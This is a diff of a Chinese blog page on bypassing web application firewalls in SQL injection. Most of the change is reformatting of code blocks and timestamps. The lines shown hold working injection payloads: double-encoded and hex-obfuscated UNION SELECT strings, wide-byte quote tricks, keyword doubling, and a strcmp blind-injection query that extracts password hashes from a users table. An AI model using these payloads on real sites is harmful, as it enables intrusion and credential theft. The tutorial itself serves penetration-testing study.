@@ -119,7 +119,7 @@
 <meta property="og:site_name" content="guolala&#39;s blog">
 <meta property="og:description" content="WAF主要针对HTTP（S）数据包进行解析从而提取相关的字段。 WAF的功能 审计设备：用来截获所有HTTP数据或者仅仅满足某些规则的会话 访问控制设备：用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式 架构/网络设计工具：当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。 WEB应用加固工具：这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-12-02T07:58:32.606Z">
+<meta property="og:updated_time" content="2018-12-02T09:07:33.918Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL的WAF绕过">
 <meta name="twitter:description" content="WAF主要针对HTTP（S）数据包进行解析从而提取相关的字段。 WAF的功能 审计设备：用来截获所有HTTP数据或者仅仅满足某些规则的会话 访问控制设备：用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式 架构/网络设计工具：当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。 WEB应用加固工具：这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点">
@@ -396,7 +396,7 @@
                 
               
 
-              <time title="创建时间：2018-12-02 15:16:47 / 修改时间：15:58:32" itemprop="dateCreated datePublished" datetime="2018-12-02T15:16:47+08:00">2018-12-02</time>
+              <time title="创建时间：2018-12-02 15:16:47 / 修改时间：17:07:33" itemprop="dateCreated datePublished" datetime="2018-12-02T15:16:47+08:00">2018-12-02</time>
             
 
             
@@ -491,10 +491,10 @@
 <p>####（1）URL编码：</p>
 <p>在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为<strong>%20</strong>、单引号<strong>%27</strong>、左括号<strong>%28</strong>、右括号<strong>%29</strong>，/为<strong>%25</strong>。</p>
 <p>普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过：</p>
-<p><code>?id=1%252f%252a*/UNION%252f%252a /SELECT————————&gt;经过两次URL解码= ?id=1/**/UNION/* /SELECT</code></p>
-<p>####（2）十六进制编码：</p>
-<p><code>/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4，SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</code></p>
-<blockquote>
+<pre><code>?id=1%252f%252a*/UNION%252f%252a /SELECT————————&gt;经过两次URL解码= ?id=1/**/UNION/* /SELECT
+</code></pre><p>####（2）十六进制编码：</p>
+<pre><code>/index.php?page_id=-15/*!u%6eion*//*!se%6cect*/ 1,2,3,4，SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))
+</code></pre><blockquote>
 <p>示例代码中，前者是对单个字符十六进制编码，后者则是对整个字符串编码，使用上来说较少见一点</p>
 </blockquote>
 <p>####（3）Unicode编码：</p>
@@ -506,8 +506,8 @@
 <li>左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</li>
 <li>右括号：%u0029、%uff09、\c0%29、\c0%a9、%e0%80%a9</li>
 </ul>
-<p><code>?id=10%D6&#39;%20AND%201=2%23 SELECT &#39;Ä&#39;=&#39;A&#39;; #1</code></p>
-<blockquote>
+<pre><code>?id=10%D6&apos;%20AND%201=2%23 SELECT &apos;Ä&apos;=&apos;A&apos;; #1
+</code></pre><blockquote>
 <p>一：前者利用宽字节绕过，比如对单引号转义操作变成\’，那么就变成了%D6%5C’，%D6%5C构成了一个宽字节即Unicode字节，单引号可以正常使用</p>
 </blockquote>
 <blockquote>
@@ -517,8 +517,8 @@
 <p>三：另外平时听得多一点的可能是utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过</p>
 </blockquote>
 <h3 id="替换关键字"><a href="#替换关键字" class="headerlink" title="替换关键字"></a>替换关键字</h3><p>这种情况下大小写转化无法绕过，而且正则表达式会替换或删除select、union这些关键字，如果只匹配一次就很容易绕过。</p>
-<p><code>index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4</code></p>
-<blockquote>
+<pre><code>index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4
+</code></pre><blockquote>
 <p>建议不要对此抱有太大希望….</p>
 </blockquote>
 <h3 id="使用注释"><a href="#使用注释" class="headerlink" title="使用注释"></a>使用注释</h3><p>常见的注释符：</p>
@@ -530,8 +530,8 @@
 --  -
 ;
 --a
-</code></pre><h4 id="（1）普通注释"><a href="#（1）普通注释" class="headerlink" title="（1）普通注释"></a>（1）普通注释</h4><p><code>index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4&#39;union%a0select pass from users#</code></p>
-<blockquote>
+</code></pre><h4 id="（1）普通注释"><a href="#（1）普通注释" class="headerlink" title="（1）普通注释"></a>（1）普通注释</h4><pre><code>index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4&apos;union%a0select pass from users#
+</code></pre><blockquote>
 <p><code>/**/</code>在构造得查询语句中插入注释，规避对<strong>空格</strong>的依赖或关键字识别;  #、–+用于终结语句的查询</p>
 </blockquote>
 <h4 id="（2）内联注释"><a href="#（2）内联注释" class="headerlink" title="（2）内联注释"></a>（2）内联注释</h4><p>相比普通注释，内联注释用的更多，它有一个特性<code>/*! */</code>只有<strong>MySQL</strong>能识别(<code>/*! */</code>表示注释里面的语句会被执行)</p>
@@ -634,14 +634,14 @@ index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 &quot;A&quot
 <p>单一的技术可能无法绕过过滤机制，但是多种技术的配合使用成功的可能性就会增加不少</p>
 </blockquote>
 <h3 id="过滤掉and和or情况下的盲注"><a href="#过滤掉and和or情况下的盲注" class="headerlink" title="过滤掉and和or情况下的盲注"></a>过滤掉and和or情况下的盲注</h3><p>假如有这样一个注入点</p>
-<p><code>index.php?uid=123</code></p>
-<p>但是and和or被过滤掉了，我们可以构造一下语句</p>
-<p><code>index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123</code></p>
-<blockquote>
+<pre><code>index.php?uid=123
+</code></pre><p>但是and和or被过滤掉了，我们可以构造一下语句</p>
+<pre><code>index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123
+</code></pre><blockquote>
 <p>123的时候页面是正确的，我们现在在盲猜hash的第一位，如果第一位等于0x42也就是B，那么strcmp结果为0，0+123=123，所以页面应该是正确的。否则就说明不是B，就这样猜，不用and和or了。</p>
 </blockquote>
-<h3 id="加括号"><a href="#加括号" class="headerlink" title="加括号"></a>加括号</h3><p><code>/?id=1+union+(select+1,2+from+users)</code></p>
-<p>如果上面一条被WAF拦截了，可以试着加一些括号。</p>
+<h3 id="加括号"><a href="#加括号" class="headerlink" title="加括号"></a>加括号</h3><pre><code>/?id=1+union+(select+1,2+from+users)
+</code></pre><p>如果上面一条被WAF拦截了，可以试着加一些括号。</p>
 <pre><code>/?id=1+union+(select+1,2+from+xxx)
 
 /?id=(1)union(select(1),mid(hash,1,32)from(users))
